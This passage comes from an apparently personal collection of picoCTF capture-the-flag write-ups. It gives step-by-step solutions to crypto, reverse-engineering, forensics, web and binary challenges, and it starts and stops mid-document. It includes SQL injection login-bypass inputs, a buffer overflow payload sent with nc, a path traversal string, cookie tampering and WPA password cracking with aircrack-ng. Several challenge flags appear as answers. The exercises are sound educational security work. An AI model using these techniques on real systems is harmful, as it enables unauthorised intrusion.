> for (i=0; i<8; i++) {
...             buffer[i] = password.charAt(i);
...         }
's'
> for (; i<16; i++) {
...             buffer[i] = password.charAt(23-i);
...         }
'n'
> for (; i<32; i+=2) {
...             buffer[i] = password.charAt(46-i);
...         }
'8'
> for (i=31; i>=17; i-=2) {
...             buffer[i] = password.charAt(i);
...         }
'g'
> console.log("picoCTF{" + buffer.join("") + "}");
picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_79958f}
undefined
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/vault-door-3.md

## rsa-pop-quiz
![](https://i.imgur.com/U9t9nMz.png)

### Hints
1. [RSA info](https://simple.wikipedia.org/wiki/RSA_algorithm)

### Solution by steps
1. Run `nc jupiter.challenges.picoctf.org 18821`
2. Open a python code editor (e.g. VScode)
3. Get the number it gave and replace the variables
```python=
import binascii
import rsa
import gmpy2
from pwn import *

# First Question
q = 60413
p = 76753
n = p*q
print("n =", n)
### 4636878989

# Second Question
p = 54269
n = 5051846941
q = n / p
print("q =", q)
### 93089

# Third Question
### n

# Fourth Question
p = 12611
q = 66347
r = (p - 1) * (q - 1)
print("r =", r)
### 836623060

# Fifth Question
n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
e = 3
msg = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
c = pow(msg, e, n)
print("c =", c)
### 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813

# Sixth Question
### n

# Seventh Question
p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
e = 65537
r = (p-1)*(q-1)
d = int(gmpy2.invert(e, r))
print("d =", d)
### 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729

# Eighth Question
p = gmpy2.mpz(153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433)
n = gmpy2.mpz(23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239)
e = 65537
c = 13433290949680532374013867441263154634705815037382789341947905025573905974395028146503162155477260989520870175638250366834087929309236841056522311567941474209163559687755762232926539910909326834168973560610986090744435081572047926364479629414399701920441091626046861493465214197526650146669009590360242375313096062285541413327190041808752295242278877995930751460977420696964385608409717277431821765402461515639686537904799084682553530460611519251872463837425068958992042166507373556839377045616866221238932332390930404993242351071392965945718308504231468783743378794612151028803489143522912976113314577732444166162766

q = n // p
d = int(gmpy2.invert(e, (p-1)*(q-1)))
m = pow(c, d, n)
print("m =", m)
### 14311663942709674867122208214901970650496788151239520971623411712977120527163003942343369341

# Ninth Question
t = 14311663942709674867122208214901970650496788151239520971623411712977120527163003942343369341
ht = hex(t)
s = binascii.a2b_hex(ht[2:])
print(s)
### b'picoCTF{wA8_th4t$_ill3aGal..oa2d2239b}'
```

### Useful Stuffs
1. https://blog.csdn.net/weixin_43659784/article/details/107305471



## Client-side-again
![](https://i.imgur.com/oi5hura.png)

### Hints
1. What is obfuscation?

### Solution by steps
1. Press the link to get here
![](https://i.imgur.com/PVeZyqP.png)
2. Press 'Ctrl + U' and copy the javascript codes between `<script>`
3. Paste them to [Javascript Beautifier](http://www.jsnice.org/)
4. And look at the var at the third line of the result
```javascript=
var _0x5a46 = ["0a029}", "_again_5", "this", "Password Verified", "Incorrect password", "getElementById", "value", "substring", "picoCTF{", "not_this"];
```
5. Get the flag `picoCTF{not_this_again_50a029}`

## Useful Stuffs
1. http://www.jsnice.org/
2. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Client-side-again.md
3. https://ctftime.org/writeup/19130

## Pitter, Patter, Platters
![](https://i.imgur.com/goO1qLL.png)

### Hints
1. It may help to analyze this image in multiple ways: as a blob, and as an actual mounted disk.
2. Have you heard of slack space? There is a certain set of tools that now come with Ubuntu that I'd recommend for examining that disk space phenomenon...

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/52f3ab2c16c051e744ea5b029c24011b/suspicious.dd.sda1`
2. ` file suspicious.dd.sda1` and get `suspicious.dd.sda1: Linux rev 1.0 ext3 filesystem data, UUID=fc168af0-183b-4e53-bdf3-9c1055413b40 (needs journal recovery)`
3. Check the file's content by ` fls suspicious.dd.sda1`
```clike=
d/d 11: lost+found
d/d 2009:       boot
d/d 4017:       tce
r/r 12: suspicious-file.txt
V/V 8033:       $OrphanFiles
```
4. Get the txt file by `icat suspicious.dd.sda1 12` and get `Nothing to see here! But you may want to look here -->`
5. `strings -a -t x suspicious.dd.sda1 | grep "Nothing to see here! But you may want to look here"` to get it's address ` 200400 Nothing to see here! But you may want to look here -->`
6. `xxd -s 0x200400 -l 200 suspicious.dd.sda1` to see the stuffs beside it
```clike=
00200400: 4e6f 7468 696e 6720 746f 2073 6565 2068  Nothing to see h
00200410: 6572 6521 2042 7574 2079 6f75 206d 6179  ere! But you may
00200420: 2077 616e 7420 746f 206c 6f6f 6b20 6865   want to look he
00200430: 7265 202d 2d3e 0a7d 0031 0032 0039 0030  re -->.}.1.2.9.0
00200440: 0038 0038 0061 0062 005f 0033 003c 005f  .8.8.a.b._.3.<._
00200450: 007c 004c 006d 005f 0031 0031 0031 0074  .|.L.m._.1.1.1.t
00200460: 0035 005f 0033 0062 007b 0046 0054 0043  .5._.3.b.{.F.T.C
00200470: 006f 0063 0069 0070 0000 0000 0000 0000  .o.c.i.p........
00200480: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00200490: 0000 0000 0000 0000 0000 0000 0000 0000  ................
002004a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
002004b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
002004c0: 0000 0000 0000 0000                      ........
```
7. Run `od --skip-bytes=0x200437 --read-bytes=66 suspicious.dd.sda1 --format=c --address-radix=n --width=100 | sed "s/\\\0//g" | tr -d " " | rev` to get your flag

### Useful stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2020_picoCTF_Mini/Pitter_Patter_Platters.md

## Web Gauntlet
![](https://i.imgur.com/KYeV3I1.png)

### Hints
1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite
5. If your cookie keeps getting reset, try using a private browser window

### Solution by steps
1. Press the link 
![](https://i.imgur.com/JniQ7Ul.png)
2. Follow these steps to get the flag
```clike
Round 1:
filter.php : or
Username: admin' --
Password: asdfgh

Round 2:
filter.php: or and like = --
Username: admin'/*
Password: asdfgh

Round 3:
filter.php: or and = like > < -- 
Username: admin'/*
Password: asdfgh
    
Round 4:
filter.php: or and = like > < -- admin
Username: adm'||'in'/*
Password: asdfgh
    
Round 5:
filter.php: or and = like > < -- union admin
Username: adm'||'in'/*
Password: asdfgh
```
3. Reload the filter.php and got the flag

### Useful Stuffs
1. https://github.com/onealmond/hacking-lab/blob/master/picoctf-2020/web-gauntlet/writeup.md
2. https://zacheller.dev/pico-web-gauntlet
3. https://medium.com/@shaunak007/picogym-web-gauntlet-983b17732b3d

## Kit Engine (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/Z4s8Tr3.png)

### Hints
1. Having a good foundation may be helpful later
2. Make sure your shellcode works for the situation.

### Solution by steps
Nah (Still thinking how to solve it without installing Linux)

### Useful Stuffs
1. https://www.youtube.com/watch?v=I5ooL_LlO7A&ab_channel=MartinCarlisle

## Some Assembly Required 4 (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/mUUNJm6.png)

### Hints
None

### Solution by steps
Nah (Still thinking how to solve it without installing Linux)

### Useful Stuffs
1. https://www.youtube.com/watch?v=EsnzsnIN0YI&ab_channel=MartinCarlisle

## scrambled-bytes
![](https://i.imgur.com/dKs5JLX.png)

### Hints
None

### Solution by steps
1. Download the pcapng file and open it by Wireshark
2. Find the data and put it in out.txt (This must be in the same directory with the file we create next)
```clojure
3b,04,79,27,76,d2,88,b9,ba,7b,fe,15,78,e5,5c,8d,ac,fa,1b,a2,48,63,04,bc,40,dc,d1,56,f3,d4,82,97,95,fa,d1,27,88,6c,df,9c,73,67,f4,93,9d,5e,72,0d,ae,9a,05,be,b0,12,6b,81,92,46,0f,92,70,23,2b,44,38,71,e3,18,fc,8d,3e,58,bd,f8,ff,72,61,f9,aa,b8,f5,f3,87,2f,5e,cc,4b,86,25,d1,95,4f,41,c2,91,93,61,10,f5,9d,96,de,1c,e3,1a,54,6d,0a,51,3b,dd,53,cf,ba,12,c9,a5,e5,5f,c9,15,b5,8c,97,90,1a,db,fe,b7,c9,e3,47,32,b5,92,63,0d,8b,37,e7,3c,1b,73,bd,87,0b,89,6b,66,dc,fa,e8,3a,9b,47,53,35,db,71,98,e4,d1,5e,b0,88,59,fd,c5,dd,87,e4,a9,02,64,01,26,25,9d,e5,37,a3,3e,74,8a,56,de,e8,52,87,8d,01,c5,80,2a,35,bd,11,e0,04,d0,8d,db,22,a9,cb,17,ad,e2,1d,48,ea,ca,c5,1b,a7,93,ff,07,82,6d,4b,74,6c,5f,d4,8b,53,32,f5,16,9a,2c,58,45,b3,61,77,0f,b0,84,54,51,27,f8,6d,f1,d9,e1,1e,2f,3c,d6,06,e6,b6,7f,8b,a7,36,03,7c,cf,2e,90,fc,47,ad,dd,d7,a2,1d,7d,0c,44,6d,b0,d3,e1,f3,f4,9b,b5,88,c9,dc,11,de,22,89,1b,f3,c5,96,60,e2,2d,6c,e2,87,51,fd,29,86,3e,c2,e9,d1,a4,05,9a,bd,09,1d,44,b4,da,73,98,0c,d3,fb,8c,33,3e,91,ed,83,4a,91,59,2f,94,78,06,fe,66,84,7b,ea,ba,cc,ef,fe,f1,5f,c3,5c,79,6f,70,dd,37,17,4d,43,20,15,1b,bc,34,39,f3,b6,3f,1c,b0,ce,47,12,b8,39,8c,05,a1,b0,ce,ce,25,0f,9c,70,ed,49,c5,ec,86,9e,56,5a,89,93,3d,0a,95,ca,4f,42,7a,34,05,be,20,2c,4e,2d,af,31,4c,7c,0f,25,d6,32,f1,f7,2e,5b,1a,49,2e,42,82,60,13,69,33,b4,90,a2,44,08,72,06,23,92,c0,e9,25,d8,45,5e,89,35,13,de,f2,ad,ae,61,0e,0a,68,cb,d2,55,a3,68,60,5f,7f,f5,a8,7e,4f,44,95,0a,6c,38,5c,1f,a7,1b,16,07,88,98,26,72,99,2d,e7,54,e2,b8,6e,d3,af,5b,2b,98,7c,8b,d6,c4,0b,06,dc,38,f0,45,cb,70,f9,61,f8,bb,27,e6,f9,0b,05,ba,ba,bf,b8,c5,03,90,88,5c,00,08,5c,d0,31,5b,50,c7,ae,a0,07,42,d1,0b,d5,fe,9c,6e,07,56,c1,13,eb,4e,ae,83,20,0c,1f,e4,4c,c1,ab,20,5c,8c,f3,97,66,af,1c,af,0b,42,e2,fd,35,fa,45,0d,86,37,e2,c6,22,4b,48,19,eb,2a,53,52,e6,41,39,d6,45,1f,1d,e3,ce,a6,31,d0,d8,ec,ea,3d,ff,7a,6b,4f,8c,72,c8,bc,f0,f9,e0,46,31,49,8e,eb,f8,28,dd,3f,90,44,71,b2,25,a3,3a,c1,f5,24,1c,0b,3b,d3,86,e8,e7,69,e7,08,03,9c,4d,ea,ee,5f,4f,32,28,33,f0,a4,c6,64,bb,cd,e0,44,4a,96,ed,f7,2d,48,3b,62,a5,54,a4,e7,b1,fd,f6,59,fc,13,80,47,8f,7b,2c,93,f6,bf,76,61,8d,71,3c,e6,fb,05,00,a7,f6,00,2c,8a,18,5a,85,9e,8f,3c,1f,be,87,f1,7d,32,f6,57,c5,d8,95,f5,96,b5,38,8a,95,7f,48,fa,26,66,8e,8e,ef,68,1e,9d,73,23,99,7c,2e,b7,4e,ca,72,ff,2a,fd,1e,6e,08,4f,63,2a,8e,7b,36,4b,64,c3,cc,74,cd,0f,7a,80,9f,dc,dd,16,56,c5,6a,d3,8c,87,8a,b9,7b,90,7d,83,c7,ed,e4,60,df,9b,80,a0,3d,cc,83,56,c2,83,f9,9a,e8,1d,10,41,1f,c8,29,cb,36,1c,28,d8,54,55,ff,04,84,15,7f,ff,35,49,e9,0e,a9,64,40,c8,73,54,9f,e0,b4,42,54,9a,df,59,49,8d,67,60,39,af,d4,ce,73,85,4f,9c,12,bf,b6,4f,99,1a,9b,3b,59,64,0e,f4,53,e6,b8,b1,3e,fd,66,21,e5,35,e6,7b,4e,81,f3,74,9c,da,9f,46,e5,e8,1d,a7,a4,7a,d3,3f,5d,a7,8d,fc,d0,13,21,47,76,c3,8c,27,a7,09,8f,e7,85,41,23,ea,b4,cb,eb,a9,4c,7b,d2,9e,4a,ee,be,6d,f0,67,bf,95,33,06,dd,d9,06,86,28,24,b2,ad,84,04,ed,61,3c,6a,05,e1,60,20,77,8a,88,f5,79,a0,c5,a9,42,c6,8b,72,bd,98,6e,f8,39,52,47,04,6b,8a,ad,07,4e,f4,8b,45,e4,4e,80,d9,5f,d6,ee,53,21,b5,bb,5d,19,94,87,01,e6,6d,ff,ef,72,51,f3,58,71,b8,86,dc,69,5e,a1,1d,80,1d,4f,20,9b,7b,99,a0,98,86,32,fa,0e,f7,b0,6d,1d,4e,93,f0,1d,8a,25,95,c8,7a,69,98,fb,3c,fa,0d,51,d6,e4,4b,52,4a,5c,06,5a,4d,7c,8a,86,c0,6f,85,df,ec,d1,6d,de,d9,4a,27,e2,66,37,d5,c1,29,2e,ac,ab,0b,39,2a,35,6c,42,ed,9c,39,01,05,40,24,3f,07,0b,bb,c6,5c,ab,6f,38,c2,58,32,e3,7f,aa,df,3b,03,c4,99,1b,5f,04,22,2b,37,ce,56,8b,14,6e,75,1d,48,23,c8,47,c8,5d,2b,7e,1b,c9,6a,aa,1f,e0,24,dd,93,83,29,4f,27,d4,0a,64,61,44,fb,f8,dc,4c,9c,42,cf,dc,6a,00,15,35,d2,b9,20,3f,75,f6,e2,26,b7,76,7c,8f,d3,66,6f,fa,12,e6,0a,56,46,9c,00,e3,f0,55,97,d4,02,45,49,5e,bc,42,15,6e,9e,70,18,fb,a8,93,c3,42,9f,2e,93,ff,ba,50,7e,2f,3b,3f,ee,81,18,ac,fc,40,62,ef,65,ea,d6,d8,36,77,7a,98,ad,a6,8f,55,cb,5c,9e,1d,cc,73,8d,55,a1,7f,d5,cc,78,5e,e3,69,3a,f2,6f,6a,7a,18,03,76,bc,6c,bd,39,7e,bf,e8,8f,22,ed,28,db,be,e7,66,68,61,b1,ac,d3,15,3b,3c,c3,1e,5d,47,04,56,f0,36,a5,c0,f6,16,fe,20,04,56,28,7c,5d,68,53,15,e6,55,bd,1d,58,bf,0f,f9,80,3d,b3,2d,3d,4c,9a,34,3e,cb,f3,38,3b,42,7d,ff,d5,57,91,ec,ee,b2,8b,27,8a,fa,e6,08,34,38,0f,30,ab,3d,f8,af,99,54,b1,de,97,8c,03,aa,43,d0,bc,76,35,3d,fa,ba,c5,03,c2,8e,8c,83,d9,4a,f0,cc,8f,1c,40,c1,cd,3e,40,f1,91,b2,3d,a2,b9,ac,ba,94,7b,d3,9a,26,f5,41,0c,22,7f,7c,71,7f,9b,f5,e3,1a,f6,06,fd,42,f3,e3,0e,e0,13,37,02,3b,44,14,29,1f,a7,cb,28,37,f2,a2,b1,5b,84,38,50,ce,68,98,02,46,ca,6c,71,05,08,7f,34,84,cb,a7,3c,62,bd,73,ea,3a,68,1e,f7,ba,73,fb,01,0f,43,7d,e3,39,d2,66,3a,82,8a,7b,ca,9f,ef,66,30,e4,ff,9e,dc,6e,0e,1d,45,b0,fb,63,d6,45,60,b9,d8,8d,f1,d8,40,29,b0,07,0f,11,2f,7a,56,7d,1d,90,c1,e9,70,e1,d9,b0,b3,ae,4a,61,89,d4,67,2f,ca,5a,93,4b,fe,10,3c,90,9f,7b,9e,e8,41,b4,78,ef,b3,95,37,94,11,5f,be,a2,db,6c,36,28,69,13,36,7c,1f,63,f9,fb,16,80,62,6d,d4,20,08,9c,8c,ba,f7,d0,61,9f,0c,ac,04,de,7c,c9,a6,55,fe,8a,ec,ab,79,30,f1,c5,55,af,3b,6c,24,d7,9f,8c,bb,75,2e,03,9e,1c,05,b5,24,b1,21,ec,18,3a,dc,e9,71,a8,c9,be,4c,7d,fa,d4,e9,73,e0,91,45,71,39,3a,57,d4,8d,8d,a2,d5,21,59,b2,7b,24,57,ab,7d,90,ee,e0,d4,fa,df,24,26,78,30,95,f9,20,ad,54,dd,d7,19,52,bf,7c,db,06,db,55,66,21,c2,91,05,48,8e,8e,e9,f9,24,ab,c1,a4,b7,50,58,1b,d6,13,6b,c5,86,d3,41,33,f8,1f,38,6c,11,1a,98,3a,bb,4b,f3,a6,f8,98,33,c9,fb,3a,b9,0f,f7,0a,18,eb,34,1f,2f,83,e0,26,2e,e9,3d,62,29,9d,5c,ff,a6,bb,3e,6b,42,48,4c,b1,cd,a3,71,83,ea,2f,e4,33,50,6a,15,f3,f1,52,c4,4c,fa,c8,5f,44,46,c3,9a,68,e8,4f,7e,17,31,c2,bd,96,7f,1d,c6,1b,8b,c8,37,8d,88,9d,aa,da,6b,ce,55,c0,e5,59,d2,e8,cb,df,ed,69,25,c5,0d,0e,77,52,76,b0,f7,f1,c9,55,25,86,40,3b,68,08,5f,da,43,fe,6c,ac,ff,ce,6a,ff,bc,f5,e4,41,30,8f,7c,34,1b,42,f7,b4,ca,28,53,fa,7e,3c,28,db,b3,90,fb,e7,90,1f,13,de,39,37,49,2a,96,fb,2a,73,40,ee,58,ce,a0,c1,9c,62,da,2c,82,ed,26,c7,76,1a,eb,43,98,ce,8f,96,3d,76,27,02,3a,5d,7c,1d,a6,c4,91,ef,a1,b1,d1,a5,b1,b4,b8,b3,6f,ae,dd,29,be,88,ea,2f,81,99,46,8f,86,0e,f2,3f,0f,c2,ed,b7,81,db,0f,48,a9,b0,7a,f2,47,7e,ab,2c,3f,38,90,17,12,d3,9f,5e,73,e6,13,40,c3,61,dc,0b,b4,0c,38,e7,94,42,41,dc,a9,f9,d9,1f,0b,66,f4,b8,fb,6d,32,de,de,0e,65,87,58,a3,6e,dd,67,f6,5c,12,4b,a3,ce,cc,bf,65,b5,6d,9b,00,8b,24,11,87,6d,df,1f,cc,d0,45,f1,16,20,08
```
3. Create a python file in Vscode and run it after writing this 
```python
#!/usr/bin/env python3

import random
from time import time


with open("out.txt", 'rt') as f:
        enc_payload = f.read().split(",")

dummy = []
for i in range(len(enc_payload)):
        dummy += [i]

random.seed(1614044650)

random.shuffle(dummy)


decode = [b"\x00"]*len(enc_payload)


k = 0
for i in enc_payload:
        tmp = random.randrange(65536)
        tmp = bytes([int(i,16)^random.randrange(256)])
        decode[dummy[k]] = tmp
        k += 1

print(b"".join(decode))

with open("solved.png", 'wb') as f:
        f.write(b"".join(decode))
```
4. And open the file to get the flag
![](https://i.imgur.com/nrS6vuX.png)

### Useful Stuffs
1. https://b1ue.x0.com/writeup/2021picomini/#scrambled-bytes
2. https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-darin
3. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF_redpwn/scrambled-bytes.md

## breadth
![](https://i.imgur.com/3uGSHZq.png)

### Hints
None

### Solution by steps
1. `cmp -bl breadth.v1 breadth.v2` and get this
```python
...
    742 250 M-(  247 M-'
    743 361 M-q  335 M-]
    744 264 M-4  251 M-)
 610380 124 T    104 D
 610383 270 M-8  110 H
 610384  72 :     75 =
 610385 200 M-^@  76 >
...
```
*0d650380 = 0x9504C*
2. Look up the function located at address 0x9504C in ghidra (or IDA) to get the flag

### Useful Stuffs
1. https://www.ctfwriteup.com/picoctf/picomini-by-redpwn/reverse-engineering#breadth
2. https://hackmd.io/@bigdrea6/BJcLLkoW5

## WPA-ing Out
![](https://i.imgur.com/bGAkgm9.png)

### Hints
1. Finding the IEEE 802.11 wireless protocol used in the wireless traffic packet capture is easier with wireshark, the JAWS of the network.
2. Aircrack-ng can make a pcap file catch big air...and crack a password.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/8/wpa-ing_out.pcap`
2. Get a rockyou.txt from github
3. `aircrack-ng wpa-ing_out.pcap -w ./rockyou.txt` and you'll get your key

### Useful Stuffs
1. https://www.youtube.com/watch?v=mAZ7PjEfWU0&ab_channel=MikeOnTech
2. https://www.youtube.com/watch?v=GmCzkyRmVZc&ab_channel=MichaelDProvenzano

## bloat.py
![](https://i.imgur.com/Ho6lRZV.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/430/bloat.flag.py`
2. `wget https://artifacts.picoctf.net/c/430/flag.txt.enc`
3. `vim bloat.flag.py` and comment these
```python
arg432 = arg232()
arg133(arg432)
arg112()
```
4. Run `python bloat.flag.py` and get your key

### Useful Stuffs
1. https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-picoCTF2022/Reverse_Engineering/200-bloat.py

## buffer overflow 1
![](https://i.imgur.com/q6njtwc.png)

### Hints
None

### Solution by steps
1. Press the 'Launch' button
![](https://i.imgur.com/ChAwcYV.png)
2. Two hints pop out
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.
3. `wget https://artifacts.picoctf.net/c/252/vuln` and `wget https://artifacts.picoctf.net/c/252/vuln.c`
4. `strings vuln.c` read it and `cat > flag.txt` and write anything you want
5. `chmod +x vuln`, run `gdb ./vuln`, `info functions` and find the `win`'s address
6. Use [overflow-exploit-pattern-generator](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) to generate a random overflow text
7. Paste the result after running `run` and find out that anything after 44 overflow offset will be parts of the output location
8. `(echo -ne 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08\n'; cat -) | nc saturn.picoctf.net 63550` and get your flag

## Useful Stuffs
1. https://shinris3n.github.io/writeups/2022/04/01/PicoCTF2022-buf1.html
2. https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html

## Forbidden Paths
![](https://i.imgur.com/hhG4FV4.png)


### Hints
None

### Solution by steps
1. Press the link and paste `../../../../flag.txt` to get your flag
![](https://i.imgur.com/SyvH3oc.png)

### Useful Stuffs
1. https://www.it-sec.fail/picoctf-2022-web-forbidden-paths/

## Fresh Java
![](https://i.imgur.com/SwR0SbP.png)

### Hints
1. Use a decompiler for Java!

### Solution by steps
1. Download the file and upload it to [Java Decompiler](http://www.javadecompilers.com/result) 
```java
import java.util.Scanner;

// 
// Decompiled by Procyon v0.5.36
// 

public class KeygenMe
{
    public static void main(final String[] array) {
        final Scanner scanner = new Scanner(System.in);
        System.out.println("Enter key:");
        final String nextLine = scanner.nextLine();
        if (nextLine.length() != 34) {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(33) != '}') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(32) != 'd') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(31) != '0') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(30) != 'a') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(29) != '1') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(28) != 'e') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(27) != 'f') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(26) != 'b') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(25) != '2') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(24) != '_') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(23) != 'd') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(22) != '3') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(21) != 'r') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(20) != '1') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(19) != 'u') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(18) != 'q') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(17) != '3') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(16) != 'r') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(15) != '_') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(14) != 'g') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(13) != 'n') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(12) != '1') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(11) != 'l') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(10) != '0') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(9) != '0') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(8) != '7') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(7) != '{') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(6) != 'F') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(5) != 'T') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(4) != 'C') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(3) != 'o') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(2) != 'c') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(1) != 'i') {
            System.out.println("Invalid key");
            return;
        }
        if (nextLine.charAt(0) != 'p') {
            System.out.println("Invalid key");
            return;
        }
        System.out.println("Valid key");
    }
}
```

### Useful Stuffs
1. http://www.javadecompilers.com/

## Power Cookie
![Uploading file..._ptgleh4cc]()

### Hints
1. Do you know how to modify cookies?

### Solution by steps
1. Use '[EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=zh-TW)' to set 'isAdmin'(shows up after pushing the 'EditThisCookie' button) to 1
2. After reloading it you'll get the key

### Useful Stuffs
1. https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=zh-TW

## Roboto Sans
![](https://i.imgur.com/vwtaHtS.png)

### Hints
None

### Solution by steps
1. Press the link and add `/roboxs.txt` to the URL
2. Decode the three strings by [Base64 Decoder](https://www.base64decode.org/) and add the normal one to the URL
3. Reload to get your flag

### Useful Stuffs
1. https://www.base64decode.org/

## RPS
![](https://i.imgur.com/Fmtlsmp.png)

### Hints
1. How does the program check if you won?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/444/game-redacted.c` and `strings game-redacted.c` to read the source code
2. Keeps enter `1` and `rockpaperscissors` five times to get your flag

### Useful Stuffs
1. https://github.com/0xs3pi0l/CTF_writeups/blob/main/PicoCTF2022/RPS/writeup.md

## Secrets
![](https://i.imgur.com/MhruFBw.png)

### Hints
1. folders folders folders

### Solution by steps
1. Press the link
![](https://i.imgur.com/hhqM0b8.png)
2. Open the picture in a new tab and delete the strings after `/secret`
`http://saturn.picoctf.net:49917/secret/assets/DX1KYM.jpg >>> http://saturn.picoctf.net:49917/secret`
4. Now your window must be a gif of Christopher Michael "Chris" Pratt.
5. Press `Ctrl + U` and press the `hidden/file.css` behind 'herf' and delete `file.css` in the URL
6. Now a login page pops out, press `Ctr + U` and click the `superhidden/login.css` behind 'herf'
7. Remove `login.css` in the URL and `Finally. You found me. But can you see me` pops out
8. Press `Ctrl + U` and get your flag

### Useful Stuffs
1. DevTool...:smile:

## Sleuthkit Apprentice
![](https://i.imgur.com/BfkyFzc.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/332/disk.flag.img.gz` and `gunzip disk.flag.img.gz`
2. Run `mmls disk.flag.img` to see the partition table
3. Grab the 'Start' number of the one have largest number of 'Length'
4. `fls -o THE_NUMBER_YOU_GOT disk.flag.img` and saw ...
```python
d/d 1994:       opt
d/d 1995:       root
d/d 1996:       run
```
5. `fls -o 360448 disk.flag.img 1995` and get
```python
r/r 2363:       .ash_history
d/d 3981:       my_folder
```
